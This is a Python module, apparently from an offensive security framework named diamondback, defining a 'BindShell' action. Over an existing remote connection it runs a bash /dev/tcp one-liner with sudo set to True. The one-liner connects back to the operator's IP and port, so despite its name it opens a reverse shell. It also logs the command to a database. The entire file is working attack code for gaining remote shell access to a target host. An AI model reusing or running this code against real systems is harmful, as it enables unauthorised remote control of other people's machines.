import logging
import multiprocessing

from diamondback.domain import Command
from diamondback.action import call_before_decorator,Action

class BindShell( Action ):
    def __init__( self, *args, **kwargs ):
        super().__init__( self, *args, **kwargs )
        self.logger = logging.getLogger( 'bindshell' )
        self.logger.info( 'initializing Bind Shell action' )

        i = self.get_input( )
        self.logger.info( f'using supplied target of {i}' )
    
        if "sudo" in kwargs:
            self.sudo = kwargs["sudo"]
        else:
            self.sudo = False

        variables = self.variables | kwargs
        self.original_command = "bash -c 'bash &>/dev/tcp/{my_ip}/{port} <&1'"

        self.command = self.original_command.format( **variables )
        self.logger.info( self.command )

    def execute_command( self ):
        """
        Execute commands on a remote host.
        
        Args:
            host: IP address of the host
            username: username
            password: password
        """
        self.logger.info(f"[Process {multiprocessing.current_process().pid}], connecting to {self.get_input()}")
        host = self.get_input()
        try:
            if self.get_connection().is_connected():
                self.logger.info(f"[{host}] Successfully connected, bring out BIND shell: {self.command}")

                c = self.lookup_command( self.command, 'revshell' )
                if not c:
                    new_command         = Command( )
                    new_command.service = self.get_connection_type()
                    new_command.value   = self.command
                    new_command.name    = self.command.split(" ")[0]

                    self.session.add( new_command )
                    self.session.commit( )

                r = self.get_connection().execute( self.command, sudo=True )
                    
                if r:
                    self.logger.info(f"[{host}] Output:{r[:200]}")  # Limit output length
            else:
                self.logger.warning( "dont attempt any commands, you arent connected!" )
        except Exception as e:
            self.logger.error(f"[{host}] Error: {str(e)}")

    @call_before_decorator
    def run( self ):
        self.logger.info(f"execute BIND shell on target {self.get_input()}...")
        
        self.execute_command( )

        self.logger.info("BIND shell execution spawned on target")

        return self